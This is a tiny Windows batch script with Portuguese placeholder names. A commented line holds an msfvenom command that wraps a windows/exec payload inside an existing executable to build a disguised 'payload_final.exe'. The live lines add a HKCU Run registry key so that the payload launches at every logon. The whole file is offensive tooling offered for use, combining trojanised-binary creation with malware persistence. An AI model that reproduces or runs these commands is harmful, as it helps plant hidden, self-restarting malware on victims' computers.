::msfvenom -p windows/exec CMD="cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NomeDoSeuPayload /t REG_SZ /d \"C:\\Caminho\\para\\seu_payload.exe\"" -x payload1.exe -o payload_final.exe
@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NomeDoSeuPayload /t REG_SZ /d "C:\Caminho\para\seu_payload.exe"
